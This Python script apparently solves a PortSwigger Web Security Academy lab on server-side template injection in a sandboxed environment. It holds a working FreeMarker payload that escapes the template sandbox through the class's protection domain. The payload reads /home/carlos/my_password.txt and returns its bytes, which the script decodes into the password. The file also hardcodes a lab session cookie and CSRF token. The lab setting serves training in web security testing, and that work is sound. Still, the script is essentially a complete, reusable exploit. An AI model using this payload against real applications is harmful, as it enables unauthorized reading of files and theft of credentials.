# Lab: Server-side template injection in a sandboxed environment
# difficulty: expert

import requests
import re

sub = '0a8b00870328f7eb801a3f8e00b5002c'
url = f'https://{sub}.web-security-academy.net'

def main():
    headers = {
        'Cookie': 'session=YUBhpQRUTvcqjmwqlSeJgL6cqy4rQvcf'
    }

    # https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#freemarker-java
    payload = '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\'/home/carlos/my_password.txt\').toURL().openStream().readAllBytes()?join(" ")}'
    body = {
        'csrf': 'fBjzsnuHgMk6fsf9lO7wYIOSm6QpRsW6',
        'template': payload,
        'template-action': 'preview'
    }

    endpoint = '/product/template?productId=1'
    r = requests.post(url+endpoint, headers=headers, data=body)

    pattern = re.compile(r'<div id=preview-result>(.*?)</div>', re.DOTALL)
    match = pattern.findall(r.text)[0].strip()
    print(match)

    password = ''
    for i in match.split(' '):
        password += chr(int(i))
    print(password)

if __name__ == '__main__':
    main()